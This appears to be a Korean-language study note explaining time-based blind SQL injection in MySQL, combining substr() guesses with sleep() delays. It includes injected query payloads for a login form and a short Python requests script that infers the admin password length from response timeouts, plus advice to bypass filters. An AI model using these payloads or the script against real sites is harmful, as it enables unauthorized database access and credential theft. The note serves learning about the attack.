# Time based blind sqli

### Time based blind sqli 란

time based sql injection 과

blind sql injection 하고 서로 응용하면서 사용하는 기법이다.

간단하게 blind sql injection에 사용하는 쿼리에 time based 를 연결시켜 반환값을

확인하는 것이다.

<br>

__예 db 구조__
```sql
databases -> test

tables -> member

columns -> id , pw

data -> ('admin','password'),('guest','guest')
```

예)
```sql
SELECT * FROM member WHERE id='admin' and substr(pw,1,1)='p' and sleep(10);

SELECT * FROM member WHERE id='' and pw='' or id='admin' and substr(pw,1,1)='p' and sleep(10);
```

이런식으로 다양하게 blind sqli 와 time based sqli 를 합쳐서 반환값을 웹페이지상에서

확인을할 수 가있다.
* * *

python 에서는 
requests 같은 모듈로 HTTP POST 또는 GET 방식으로
전송할때 데이터를 조금만 더 추가하면된다.

<br>

__밑의 링크를 읽어보지않거나 공격 기법을 모르면 참고해도 좋다.__

+ [time based sql injection 이란?](https://github.com/kimminwyk/Study-notes/tree/master/SQL/MYSQL/MYSQL-SQL-injection/time-based-sql-injection)

+ [blind sql injection 이란?](https://github.com/kimminwyk/Study-notes/tree/master/SQL/MYSQL/MYSQL-SQL-injection/blind-sql-injection)

+ [자세한 blind sqli python script](https://github.com/kimminwyk/Study-notes/blob/master/SQL/MYSQL/MYSQL-SQL-injection/blind-sql-injection/blind-sql-injection-python-script.md)

<br>

```sql
SELECT * FROM member WHERE id='' and pw=''
```

위의 sql 쿼리대로 time based blind sql injection 을 시도한다면

```py
body = {
    'uid':"admin' and substr(pw,1,1)='p' and sleep(10)--'"
    'upw':'a'
}
```

```py
import requests

Url = "in Url"

for length in range(1,100):
    data = {
        'uid':f"admin' and length(pw)={length} and sleep(10)--'"
        'upw':'a'
    }
    try:
        r = requests.post(Url,data = data,timeout = 2)

    except:
        print('userid admin in password length :',length)
```
이와같이 blind sqli 에 사용하는 쿼리과 time based sqli 와 사용하는 쿼리를 조합시켜 완성 시키면 된다.
* * *
그리고 sleep() 같은 함수를 굳이 사용하지않아도

time based sql injection 에서 필터링시에 우회할수있는 쿼리나 함수를 추가하면 된다.

<br>

### 마무리

blind sqli 과 time based sqli 과 합치면서

서로 필터링이 되지않는 함수들을 사용하여 우회를 하고

만들어진 query 로 전송하여 스크립트를 만들면 된다.
